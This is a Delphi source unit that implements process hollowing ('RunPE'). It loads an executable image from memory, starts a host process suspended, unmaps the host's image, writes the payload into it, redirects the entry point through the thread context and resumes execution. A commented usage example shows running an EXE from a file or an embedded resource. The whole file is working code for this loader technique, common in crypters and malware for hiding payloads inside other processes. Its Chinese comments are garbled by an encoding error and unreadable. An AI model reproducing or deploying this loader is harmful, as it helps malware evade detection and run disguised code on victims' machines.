unit PEUnit;

interface

uses windows;

function MemExecute(const ABuffer; Len: Integer; CmdParam: string; var ProcessId: Cardinal): Cardinal;

implementation

//{$R ExeShell.res}                                           // ��ǳ���ģ��(98��ʹ��)

type
  TImageSectionHeaders = array[0..0] of TImageSectionHeader;
  PImageSectionHeaders = ^TImageSectionHeaders;

  { ��������Ĵ�С }
function GetAlignedSize(Origin, Alignment: Cardinal): Cardinal;
begin
  result := (Origin + Alignment - 1) div Alignment * Alignment;
end;

{ �������pe��������Ҫռ�ö����ڴ棬δֱ��ʹ��OptionalHeader.SizeOfImage��Ϊ�������Ϊ��˵�еı��������ɵ�exe���ֵ����0 }
function CalcTotalImageSize(MzH: PImageDosHeader; FileLen: Cardinal; peH: PImageNtHeaders;
  peSecH: PImageSectionHeaders): Cardinal;
var
  i: Integer;
begin
  {����peͷ�Ĵ�С}
  result := GetAlignedSize(PeH.OptionalHeader.SizeOfHeaders, PeH.OptionalHeader.SectionAlignment);

  {�������нڵĴ�С}
  for i := 0 to peH.FileHeader.NumberOfSections - 1 do
    if peSecH[i].PointerToRawData + peSecH[i].SizeOfRawData > FileLen then // �����ļ���Χ
    begin
      result := 0;
      exit;
    end
    else if peSecH[i].VirtualAddress <> 0 then              //��������ĳ�ڵĴ�С
      if peSecH[i].Misc.VirtualSize <> 0 then
        result := GetAlignedSize(peSecH[i].VirtualAddress + peSecH[i].Misc.VirtualSize, PeH.OptionalHeader.SectionAlignment)
      else
        result := GetAlignedSize(peSecH[i].VirtualAddress + peSecH[i].SizeOfRawData, PeH.OptionalHeader.SectionAlignment)
    else if peSecH[i].Misc.VirtualSize < peSecH[i].SizeOfRawData then
      result := result + GetAlignedSize(peSecH[i].SizeOfRawData, peH.OptionalHeader.SectionAlignment)
    else
      result := result + GetAlignedSize(peSecH[i].Misc.VirtualSize, PeH.OptionalHeader.SectionAlignment);

end;

{ ����pe���ڴ沢�������н� }
function AlignPEToMem(const Buf; Len: Integer; var PeH: PImageNtHeaders;
  var PeSecH: PImageSectionHeaders; var Mem: Pointer; var ImageSize: Cardinal): Boolean;
var
  SrcMz: PImageDosHeader;                                   // DOSͷ
  SrcPeH: PImageNtHeaders;                                  // PEͷ
  SrcPeSecH: PImageSectionHeaders;                          // �ڱ�
  i: Integer;
  l: Cardinal;
  Pt: Pointer;
begin
  result := false;
  SrcMz := @Buf;
  if Len < sizeof(TImageDosHeader) then
    exit;
  if SrcMz.e_magic <> IMAGE_DOS_SIGNATURE then
    exit;
  if Len < SrcMz._lfanew + Sizeof(TImageNtHeaders) then
    exit;
  SrcPeH := pointer(Integer(SrcMz) + SrcMz._lfanew);
  if (SrcPeH.Signature <> IMAGE_NT_SIGNATURE) then
    exit;
  if (SrcPeH.FileHeader.Characteristics and IMAGE_FILE_DLL <> 0) or
    (SrcPeH.FileHeader.Characteristics and IMAGE_FILE_EXECUTABLE_IMAGE = 0)
    or (SrcPeH.FileHeader.SizeOfOptionalHeader <> SizeOf(TImageOptionalHeader)) then
    exit;
  SrcPeSecH := Pointer(Integer(SrcPeH) + SizeOf(TImageNtHeaders));
  ImageSize := CalcTotalImageSize(SrcMz, Len, SrcPeH, SrcPeSecH);
  if ImageSize = 0 then
    exit;
  Mem := VirtualAlloc(nil, ImageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // �����ڴ�
  if Mem <> nil then
  begin
    // ������Ҫ���Ƶ�PEͷ�ֽ���
    l := SrcPeH.OptionalHeader.SizeOfHeaders;
    for i := 0 to SrcPeH.FileHeader.NumberOfSections - 1 do
      if (SrcPeSecH[i].PointerToRawData <> 0) and (SrcPeSecH[i].PointerToRawData < l) then
        l := SrcPeSecH[i].PointerToRawData;
    Move(SrcMz^, Mem^, l);
    PeH := Pointer(Integer(Mem) + PImageDosHeader(Mem)._lfanew);
    PeSecH := Pointer(Integer(PeH) + sizeof(TImageNtHeaders));

    Pt := Pointer(Cardinal(Mem) + GetAlignedSize(PeH.OptionalHeader.SizeOfHeaders, PeH.OptionalHeader.SectionAlignment));
    for i := 0 to PeH.FileHeader.NumberOfSections - 1 do
    begin
      // ��λ�ý����ڴ��е�λ��
      if PeSecH[i].VirtualAddress <> 0 then
        Pt := Pointer(Cardinal(Mem) + PeSecH[i].VirtualAddress);

      if PeSecH[i].SizeOfRawData <> 0 then
      begin
        // �������ݵ��ڴ�
        Move(Pointer(Cardinal(SrcMz) + PeSecH[i].PointerToRawData)^, pt^, PeSecH[i].SizeOfRawData);
        if peSecH[i].Misc.VirtualSize < peSecH[i].SizeOfRawData then
          pt := pointer(Cardinal(pt) + GetAlignedSize(PeSecH[i].SizeOfRawData, PeH.OptionalHeader.SectionAlignment))
        else
          pt := pointer(Cardinal(pt) + GetAlignedSize(peSecH[i].Misc.VirtualSize, peH.OptionalHeader.SectionAlignment));
        // pt ��λ����һ�ڿ�ʼλ��
      end
      else
        pt := pointer(Cardinal(pt) + GetAlignedSize(PeSecH[i].Misc.VirtualSize, PeH.OptionalHeader.SectionAlignment));
    end;
    result := True;
  end;
end;

type
  TVirtualAllocEx = function(hProcess: THandle; lpAddress: Pointer;
    dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer; stdcall;

var
  MyVirtualAllocEx: TVirtualAllocEx = nil;

function IsNT: Boolean;
begin
  result := Assigned(MyVirtualAllocEx);
end;

{ ������ǳ��������� }
function PrepareShellExe(CmdParam: string; BaseAddr, ImageSize: Cardinal): string;
var
  r, h, sz: Cardinal;
  p: Pointer;
  fid, l: Integer;
  buf: Pointer;
  peH: PImageNtHeaders;
  peSecH: PImageSectionHeaders;
begin
  if IsNT then
    { NT ϵͳ��ֱ��ʹ�����������Ϊ��ǽ��� }
    result := ParamStr(0) + CmdParam
  else
  begin
    // ����98ϵͳ���޷����·�����ǽ���ռ���ڴ�,���Ա��뱣֤���е���ǳ���������Ŀ����̲��Ҽ��ص�ַһ��
    // �˴�ʹ�õķ����Ǵ���Դ���ͷų�һ�����Ƚ����õ���ǳ���,Ȼ��ͨ���޸���PEͷʹ������ʱ�ܼ��ص�ָ����ַ������������Ŀ�����
    r := FindResource(HInstance, 'SHELL_EXE', RT_RCDATA);
    h := LoadResource(HInstance, r);
    p := LockResource(h);
    l := SizeOfResource(HInstance, r);
    GetMem(Buf, l);
    Move(p^, Buf^, l);                                      // �����ڴ�
    FreeResource(h);
    peH := Pointer(Integer(Buf) + PImageDosHeader(Buf)._lfanew);
    peSecH := Pointer(Integer(peH) + sizeof(TImageNtHeaders));
    peH.OptionalHeader.ImageBase := BaseAddr;               // �޸�PEͷ�صļ��ػ�ַ
    if peH.OptionalHeader.SizeOfImage < ImageSize then      // Ŀ�����Ǵ�,�޸���ǳ�������ʱռ�õ��ڴ�
    begin
      sz := Imagesize - peH.OptionalHeader.SizeOfImage;
      Inc(peH.OptionalHeader.SizeOfImage, sz);              // ������ռ���ڴ���
      Inc(peSecH[peH.FileHeader.NumberOfSections - 1].Misc.VirtualSize, sz); // �������һ��ռ���ڴ���
    end;

    // ������ǳ����ļ���, Ϊ������ĺ�׺���õ���
    // ���ڲ��� uses SysUtils (һ�� use �˳�������80K����), ����͵��������ֻ֧���������11�����̣���׺��Ϊ.dat, .da0~.da9
    result := ParamStr(0);
    result := copy(result, 1, length(result) - 4) + '.dat';
    r := 0;
    while r < 10 do
    begin
      fid := CreateFile(pchar(result), GENERIC_READ or GENERIC_WRITE, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
      if fid < 0 then
      begin
        result := copy(result, 1, length(result) - 3) + 'da' + Char(r + Byte('0'));
        inc(r);
      end
      else
      begin
        //SetFilePointer(fid, Imagesize, nil, 0);
        //SetEndOfFile(fid);
        //SetFilePointer(fid, 0, nil, 0);
        WriteFile(fid, Buf^, l, h, nil);                    // д���ļ�
        CloseHandle(fid);
        break;
      end;
    end;
    result := '"' + Result + '"' + CmdParam;                // ����������
    FreeMem(Buf);
  end;
end;

{ �Ƿ�������ض����б� }
function HasRelocationTable(peH: PImageNtHeaders): Boolean;
begin
  result := (peH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress <> 0)
    and (peH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size <> 0);
end;

type
  PImageBaseRelocation = ^TImageBaseRelocation;
  TImageBaseRelocation = packed record
    VirtualAddress: cardinal;
    SizeOfBlock: cardinal;
  end;

  { �ض���PE�õ��ĵ�ַ }
procedure DoRelocation(peH: PImageNtHeaders; OldBase, NewBase: Pointer);
var
  Delta: Cardinal;
  p: PImageBaseRelocation;
  pw: PWord;
  i: Integer;
begin
  Delta := Cardinal(NewBase) - peH.OptionalHeader.ImageBase;
  p := pointer(cardinal(OldBase) + peH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
  while (p.VirtualAddress + p.SizeOfBlock <> 0) do
  begin
    pw := pointer(Integer(p) + Sizeof(p^));
    for i := 1 to (p.SizeOfBlock - Sizeof(p^)) div 2 do
    begin
      if pw^ and $F000 = $3000 then
        Inc(PCardinal(Cardinal(OldBase) + p.VirtualAddress + (pw^ and $0FFF))^, Delta);
      inc(pw);
    end;
    p := Pointer(pw);
  end;
end;

type
  TZwUnmapViewOfSection = function(Handle, BaseAdr: Cardinal): Cardinal; stdcall;

  { ж��ԭ���ռ���ڴ� }
function UnloadShell(ProcHnd, BaseAddr: Cardinal): Boolean;
var
  M: HModule;
  ZwUnmapViewOfSection: TZwUnmapViewOfSection;
begin
  result := False;
  m := LoadLibrary('ntdll.dll');
  if m <> 0 then
  try
    ZwUnmapViewOfSection := GetProcAddress(m, 'ZwUnmapViewOfSection');
    if assigned(ZwUnmapViewOfSection) then
    try
      result := (ZwUnmapViewOfSection(ProcHnd, BaseAddr) = 0);
    except
    end;
  finally
    FreeLibrary(m);
  end;
end;

{ ������ǽ��̲���ȡ���ַ����С�͵�ǰ����״̬ }
function CreateChild(Cmd: string; var Ctx: TContext; var ProcHnd, ThrdHnd, ProcId, BaseAddr, ImageSize: Cardinal): Boolean;
var
  si: TStartUpInfo;
  pi: TProcessInformation;
  Old: Cardinal;
  MemInfo: TMemoryBasicInformation;
  p: Pointer;
begin
  FillChar(si, Sizeof(si), 0);
  FillChar(pi, SizeOf(pi), 0);
  si.cb := sizeof(si);
  result := CreateProcess(nil, PChar(Cmd), nil, nil, False, CREATE_SUSPENDED, nil, nil, si, pi); // �Թ���ʽ���н���
  if result then
  begin
    ProcHnd := pi.hProcess;
    ThrdHnd := pi.hThread;
    ProcId := pi.dwProcessId;

    { ��ȡ��ǽ�������״̬��[ctx.Ebx+8]�ڴ洦�������ǽ��̵ļ��ػ�ַ��ctx.Eax�������ǽ��̵���ڵ�ַ }
    ctx.ContextFlags := CONTEXT_FULL;
    GetThreadContext(ThrdHnd, ctx);
    ReadProcessMemory(ProcHnd, Pointer(ctx.Ebx + 8), @BaseAddr, SizeOf(Cardinal), Old); // ��ȡ���ػ�ַ
    p := Pointer(BaseAddr);

    { ������ǽ���ռ�е��ڴ� }
    while VirtualQueryEx(ProcHnd, p, MemInfo, Sizeof(MemInfo)) <> 0 do
    begin
      if MemInfo.State = MEM_FREE then
        break;
      p := Pointer(Cardinal(p) + MemInfo.RegionSize);
    end;
    ImageSize := Cardinal(p) - Cardinal(BaseAddr);
  end;
end;

{ ������ǽ��̲���Ŀ������滻��Ȼ��ִ�� }
function AttachPE(CmdParam: string; peH: PImageNtHeaders; peSecH: PImageSectionHeaders;
  Ptr: Pointer; ImageSize: Cardinal; var ProcId: Cardinal): Cardinal;
var
  s: string;
  Addr, Size: Cardinal;
  ctx: TContext;
  Old: Cardinal;
  p: Pointer;
  Thrd: Cardinal;
begin
  result := INVALID_HANDLE_VALUE;
  s := PrepareShellExe(CmdParam, peH.OptionalHeader.ImageBase, ImageSize);
  if CreateChild(s, ctx, result, Thrd, ProcId, Addr, Size) then
  begin
    p := nil;
    if (peH.OptionalHeader.ImageBase = Addr) and (Size >= ImageSize) then // ��ǽ��̿�������Ŀ����̲��Ҽ��ص�ַһ��
    begin
      p := Pointer(Addr);
      VirtualProtectEx(result, p, Size, PAGE_EXECUTE_READWRITE, Old);
    end
    else if IsNT then                                       // 98 ��ʧ��
    begin
      if UnloadShell(result, Addr) then                     // ж����ǽ���ռ���ڴ�
        // ���°�Ŀ����̼��ػ�ַ�ʹ�С�����ڴ�
        p := MyVirtualAllocEx(Result, Pointer(peH.OptionalHeader.ImageBase), ImageSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      if (p = nil) and hasRelocationTable(peH) then         // �����ڴ�ʧ�ܲ���Ŀ�����֧���ض���
      begin
        // �������ַ�����ڴ�
        p := MyVirtualAllocEx(result, nil, ImageSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if p <> nil then
          DoRelocation(peH, Ptr, p);                        // �ض���
      end;
    end;
    if p <> nil then
    begin
      WriteProcessMemory(Result, Pointer(ctx.Ebx + 8), @p, Sizeof(DWORD), Old); // ����Ŀ��������л����еĻ�ַ
      peH.OptionalHeader.ImageBase := Cardinal(p);
      if WriteProcessMemory(Result, p, Ptr, ImageSize, Old) then // ����PE���ݵ�Ŀ�����
      begin
        ctx.ContextFlags := CONTEXT_FULL;
        if Cardinal(p) = Addr then
          ctx.Eax := peH.OptionalHeader.ImageBase + peH.OptionalHeader.AddressOfEntryPoint // �������л����е���ڵ�ַ
        else
          ctx.Eax := Cardinal(p) + peH.OptionalHeader.AddressOfEntryPoint;
        SetThreadContext(Thrd, ctx);                        // �������л���
        ResumeThread(Thrd);                                 // ִ��
        CloseHandle(Thrd);
      end
      else
      begin                                                 // ����ʧ��,ɱ����ǽ���
        TerminateProcess(Result, 0);
        CloseHandle(Thrd);
        CloseHandle(Result);
        Result := INVALID_HANDLE_VALUE;
      end;
    end
    else
    begin                                                   // ����ʧ��,ɱ����ǽ���
      TerminateProcess(Result, 0);
      CloseHandle(Thrd);
      CloseHandle(Result);
      Result := INVALID_HANDLE_VALUE;
    end;
  end;
end;

function MemExecute(const ABuffer; Len: Integer; CmdParam: string; var ProcessId: Cardinal): Cardinal;
var
  peH: PImageNtHeaders;
  peSecH: PImageSectionHeaders;
  Ptr: Pointer;
  peSz: Cardinal;
begin
  result := INVALID_HANDLE_VALUE;
  if alignPEToMem(ABuffer, Len, peH, peSecH, Ptr, peSz) then
  begin
    result := AttachPE(CmdParam, peH, peSecH, Ptr, peSz, ProcessId);
    VirtualFree(Ptr, peSz, MEM_DECOMMIT);
    //VirtualFree(Ptr, 0, MEM_RELEASE);
  end;
end;

initialization
  MyVirtualAllocEx := GetProcAddress(GetModuleHandle('Kernel32.dll'), 'VirtualAllocEx');

{//����ʾ��
  **��������EXE
var
  ABuffer: array of byte;
  Stream: TFileStream;
  ProcessId: Cardinal;
begin
  Stream := TFileStream.Create('E:\Delphi Projects\TK\Bin\TK.exe', fmOpenRead);
  try
    SetLength(ABuffer, Stream.Size);
    Stream.ReadBuffer(ABuffer[0], Stream.Size);
    MemExecute(ABuffer[0], Stream.Size, '', ProcessId);
  finally
    Stream.Free;
  end;
end;

  ** ����Դ�ļ�����EXE
  ** exefile.rc
  ** 1 EXE "E:\Delphi Projects\TK\Bin\TK.exe"
var
  Buf : Pointer;
  Size  : DWORD;
  ProcessId: Cardinal;
  ResHandle:Cardinal;
begin
  ResHandle :=  FindResource(hInstance, Pointer(1), 'EXE');
  if ResHandle > 0 then
  begin
    Size := SizeofResource(hInstance, ResHandle);
    Buf :=  LockResource(LoadResource(hInstance, ResHandle));
    MemExecute(PChar(Buf)[0], Size, '', ProcessId);
  end;
end;
//}
end.

